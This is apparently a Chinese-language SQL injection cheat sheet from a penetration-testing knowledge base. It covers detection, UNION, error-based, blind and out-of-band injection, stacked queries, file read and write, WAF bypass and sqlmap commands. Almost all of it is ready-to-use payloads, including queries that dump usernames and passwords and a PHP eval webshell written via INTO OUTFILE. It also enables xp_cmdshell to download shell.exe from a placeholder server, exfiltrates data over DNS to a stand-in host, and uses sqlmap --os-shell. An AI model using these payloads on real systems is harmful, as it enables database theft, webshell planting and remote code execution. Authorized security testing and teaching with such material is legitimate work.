# SQL 注入实战参考
- SQLMap 自动化利用 → `tools-sqlmap.md`
- WAF 环境下的绕过技巧 → `web-waf-bypass.md`

> 分类: 检测 → Union注入 → 报错注入 → 盲注(布尔/时间) → 堆叠 → 写文件/读文件 → WAF绕过 → SQLMap

> **last_updated**: 2026-06-04 | **tested_against**: MySQL 5.7/8.0, MSSQL 2019, PostgreSQL 14, Oracle 19c
---

## 1. 检测方法

### 1.1 手工快速检测

```bash
# 基础闭合测试 (参数值后追加)
'       # 单引号 → 报错 = 可能注入点
"       # 双引号
')      # 括号闭合
")      # 双引号+括号
\;      # 转义符测试 (MSSQL/PostgreSQL)
```

**数字型 vs 字符型判断:**
```
?id=1 AND 1=1      # 正常 → 数字型
?id=1' AND '1'='1  # 正常 → 字符型(单引号)
?id=1" AND "1"="1  # 正常 → 字符型(双引号)
```

### 1.2 HTTP 参数位置检测

```
GET参数:    ?id=1'             → URL编码: %27
POST body:  username=admin'    → Content-Type: x-www-form-urlencoded
Cookie:     Cookie: uid=1'     → 常有惊喜
User-Agent: User-Agent: '      → 日志注入 → 二次注入
Referer:    Referer: '         → 同上
JSON:       {"id":"1'"}        → Content-Type: application/json
```

### 1.3 自动化检测

```bash
# SQLMap 全自动检测
sqlmap -u "http://target.com/page.php?id=1" --batch --random-agent

# 指定参数
sqlmap -u "http://target.com/page.php?id=1&cat=2" -p id --batch

# POST 请求
sqlmap -u "http://target.com/login" --data="user=admin&pass=123" --batch

# 从 Burp 文件加载 (推荐)
sqlmap -r request.txt --batch

# 全部参数检测 + 高等级
sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3 --batch
```

---

## 2. UNION 注入 (有回显)

### 2.1 列数探测

```sql
' ORDER BY 1--     # 逐步增加直到报错
' ORDER BY 10--    # 报错 → 列数 = 9
' UNION SELECT NULL--               # 1列
' UNION SELECT NULL,NULL--          # 2列
' UNION SELECT NULL,NULL,NULL--     # 3列...
```

### 2.2 确定回显列位置

```sql
# MySQL/MSSQL
' UNION SELECT 1,2,3,4,5--          # 看页面哪些数字出现

# Oracle (必须带 FROM)
' UNION SELECT 1,2,3,4,5 FROM DUAL--
```

### 2.3 通过回显列读取数据

```sql
# === MySQL ===
' UNION SELECT 1,database(),3,4--           # 当前库名
' UNION SELECT 1,version(),3,4--            # 数据库版本
' UNION SELECT 1,user(),3,4--               # 当前用户
' UNION SELECT 1,@@datadir,3,4--            # 数据目录
' UNION SELECT 1,group_concat(schema_name),3,4 FROM information_schema.schemata--  # 所有库
' UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema='dbname'--
' UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1,group_concat(username,0x3a,password),3,4 FROM users--

# === MSSQL ===
' UNION SELECT 1,DB_NAME(),3,4--
' UNION SELECT 1,@@VERSION,3,4--
' UNION SELECT 1,STRING_AGG(name,','),3,4 FROM sys.databases--
' UNION SELECT 1,STRING_AGG(name,','),3,4 FROM sys.tables--
```

---

## 3. 报错注入 (无回显、有报错)

### 3.1 MySQL 报错注入

```sql
# extractvalue (最长32字符)
' AND extractvalue(1,concat(0x7e,database()))--
' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))--

# updatexml
' AND updatexml(1,concat(0x7e,database()),1)--

# 突破32字符限制 — 用substring分段
' AND extractvalue(1,concat(0x7e,substring((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),1,32)))--
' AND extractvalue(1,concat(0x7e,substring((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),33,64)))--

# 重复报错 (双查询/floor报错)
' AND (SELECT 1 FROM (SELECT count(*),concat(database(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

### 3.2 MSSQL 报错注入

```sql
# convert 报错
' AND 1=convert(int,@@version)--

# 子查询报错
' AND 1=(SELECT TOP 1 name FROM sysobjects WHERE xtype='U')--
```

### 3.3 PostgreSQL 报错注入

```sql
' AND 1=CAST(current_database() AS int)--
' AND 1=CAST((SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public') AS int)--
```

---

## 4. 盲注 (无回显、无报错)

### 4.1 布尔盲注

```sql
# === MySQL ===
# 按位猜库名长度
' AND (SELECT LENGTH(database()))>5--       # 正常 → 长度>5
' AND (SELECT LENGTH(database()))=8--       # 正常 → 长度=8

# 逐字符猜库名
' AND (SELECT SUBSTRING(database(),1,1))='a'--    # ASCII方式更稳
' AND ASCII(SUBSTRING(database(),1,1))>100--

# 逐行猜表名
' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))>100--

# 逐行猜列名
' AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1),1,1))>100--

# 猜数据
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1))>50--
```

### 4.2 时间盲注 (最通用)

```sql
# === MySQL ===
' AND IF(1=1,SLEEP(3),0)--                   # 延时=可注入
' AND IF((SELECT LENGTH(database()))>5,SLEEP(3),0)--

# === MSSQL ===
'; IF (SELECT COUNT(*) FROM sys.databases)>5 WAITFOR DELAY '0:0:3'--

# === PostgreSQL ===
'; SELECT CASE WHEN (SELECT LENGTH(current_database()))>5 THEN pg_sleep(3) ELSE pg_sleep(0) END--
```

### 4.3 OOB (Out-of-Band / 带外注入)

```sql
# === MySQL DNS带外 (需 root 权限 + secure_file_priv为空) ===
' AND (SELECT LOAD_FILE(CONCAT('\\\\',database(),'.your-dns-server.com\\a.txt')))--

# === MSSQL DNS带外 ===
'; EXEC master.dbo.xp_dirtree '\\\\your-dns-server.com\\a.txt'--
'; EXEC xp_subdirs '\\\\your-dns-server.com\\a'--

# === Oracle DNS带外 ===
' UNION SELECT UTL_HTTP.REQUEST('http://your-server.com/'||(SELECT banner FROM v$version)) FROM DUAL--
```

---

## 5. 堆叠注入 (多语句执行)

> 堆叠注入的核心验证目标是**确认多语句执行能力**，用无害语句验证即可。破坏性操作（DROP/INSERT/xp_cmdshell）在实际渗透中通过 §6 读写文件实现。

```sql
# MySQL (需 PHP MySQLi multi_query / Python pymysql)
'; SELECT database()--                       # 验证多语句执行 + 信息探测
'; SELECT @@version--                        # 版本信息
'; SELECT SLEEP(3)--                         # 延时验证堆叠执行

# MSSQL (默认支持堆叠)
'; SELECT @@version--                        # 版本信息
'; WAITFOR DELAY '0:0:3'--                   # 延时验证堆叠执行
'; SELECT DB_NAME()--                        # 当前库名

# PostgreSQL
'; SELECT pg_sleep(5)--                      # 延时验证堆叠执行
'; SELECT current_database()--               # 当前库名
'; SELECT version()--                        # 版本信息
```

---

## 6. 读写文件

### 6.1 MySQL

```sql
# === 读文件 (需 FILE 权限) ===
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4--
' UNION SELECT 1,LOAD_FILE('C:\\Windows\\win.ini'),3,4--

# 判断权限
' UNION SELECT 1,file_priv,3,4 FROM mysql.user WHERE user=user()--

# === 写文件 — 写Webshell (需 secure_file_priv为空 或 可写目录) ===
' UNION SELECT 1,'<?php @eval($_POST[1]);?>',3,4 INTO OUTFILE '/var/www/html/shell.php'--
' UNION SELECT 1,0x3c3f70687020406576616c28245f504f53545b315d293b3f3e,3,4 INTO DUMPFILE '/var/www/html/shell.php'--  # hex编码防转义

# 查看 secure_file_priv 值
' UNION SELECT 1,@@secure_file_priv,3,4--
# NULL   → 无限制
# /tmp/  → 仅该目录
# (空)   → 禁用
```

### 6.2 MSSQL

```sql
# 启用 xp_cmdshell
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--

# 执行命令
'; EXEC xp_cmdshell 'whoami'--
'; EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest http://yourserver/shell.exe -OutFile C:\temp\shell.exe"'--
'; EXEC xp_cmdshell 'type C:\Windows\win.ini'--
```

---

## 7. WAF 绕过 (SQL注入专用)

### 7.1 关键字绕过

```sql
# 大小写
SELECT → SeLeCt / Select / sElEcT

# 内联注释 (MySQL)
SELECT → /*!50000SELECT*/
UNION  → /*!50000UNION*/

# 双写 (简单WAF)
UNION → UNIUNIONON
FROM  → FRFROMOM

# 等价替换
AND → &&
OR  → ||
=   → LIKE / REGEXP / BETWEEN
空格 → /**/ / %09 / %0a / %0d / %0c / +
```

### 7.2 函数绕过

```sql
# sleep → benchmark
SLEEP(5) → BENCHMARK(5000000,MD5(1))

# information_schema → 无列名注入 (MySQL 5.7+)  
# 不用 information_schema 获取表名
' UNION SELECT 1,group_concat(table_name),3 FROM mysql.innodb_table_stats WHERE database_name=schema()--

# information_schema → sys schema (MySQL 5.7+)
' UNION SELECT 1,group_concat(table_name),3 FROM sys.schema_table_statistics WHERE table_schema=database()--
```

### 7.3 等价函数速查表

| 原始 | 绕过 |
|------|------|
| `MID(str,1,1)` | `SUBSTRING(str,1,1)` / `SUBSTR(str,1,1)` / `LEFT(str,1)` |
| `ASCII('a')` | `ORD('a')` / `UNICODE('a')` |
| `LIMIT 0,1` | `LIMIT 1 OFFSET 0` |
| `COUNT(*)` | `COUNT(1)` / `COUNT(id)` |
| `SLEEP(5)` | `BENCHMARK(100000000,MD5(1))` |
| `@@version` | `VERSION()` |
| `@@datadir` | `@@GLOBAL.datadir` |

---

## 8. 常用 SQLMap 参数

```bash
# === 基础 ===
sqlmap -u "URL" --batch --random-agent                    # 自动化
sqlmap -u "URL" --dbs                                     # 列库
sqlmap -u "URL" -D dbname --tables                        # 列表
sqlmap -u "URL" -D dbname -T users --columns              # 列字段
sqlmap -u "URL" -D dbname -T users -C user,pass --dump    # 拖数据

# === 高级 ===
sqlmap -u "URL" --os-shell                                # 系统SHELL (需权限)
sqlmap -u "URL" --file-read "/etc/passwd"                 # 读文件
sqlmap -u "URL" --file-write "shell.php" --file-dest "/var/www/html/shell.php"  # 写文件
sqlmap -u "URL" --tamper=space2comment --tamper=randomcase  # tamper绕过

# === 常用tamper ===
# space2comment   → 空格替换为 /**/
# randomcase      → 随机大小写
# charunicodeencode → Unicode编码
# charencode      → URL编码
# versionedmorekeywords → MySQL内联注释
# between         → > < 替换为 BETWEEN

# === 请求模板 ===
sqlmap -r request.txt --batch --level=3                   # 从文件加载
sqlmap -r request.txt --batch --level=5 --risk=3 --tamper=space2comment,randomcase  # 全开
```

---

## 9. 各数据库特征速查

| 特征 | MySQL | MSSQL | PostgreSQL | Oracle |
|------|-------|-------|------------|--------|
| 注释 | `--` `#` `/**/` | `--` `/**/` | `--` `/**/` | `--` `/**/` |
| 字符串连接 | `CONCAT()` / `||` | `+` | `\|\|` | `\|\|` |
| 版本函数 | `@@version` `VERSION()` | `@@VERSION` | `VERSION()` | `v$version` |
| 库/用户 | `database()` `user()` | `DB_NAME()` `SYSTEM_USER` | `current_database()` `current_user` | `SYS.DATABASE_NAME` |
| 元数据表 | `information_schema` | `information_schema` | `information_schema` | `ALL_TABLES` |
| 报错注入 | extractvalue/updatexml/floor | convert/子查询 | CAST | CTXSYS/UTL_INADDR |
| 堆叠查询 | 需多语句支持 | 原生支持 | 原生支持 | 有限支持 |
| 命令执行 | UDF/OUTFILE | xp_cmdshell | COPY/程序语言 | Java存储过程 |
| DNS带外 | LOAD_FILE | xp_dirtree/xp_subdirs | 需dblink扩展 | UTL_HTTP/UTL_INADDR |

---
## 相关参考
- SQLMap 自动化利用 → `tools-sqlmap.md`
- WAF 环境下的绕过技巧 → `web-waf-bypass.md`

*参考: OWASP SQL Injection Cheat Sheet + WooYun 实战案例整理*
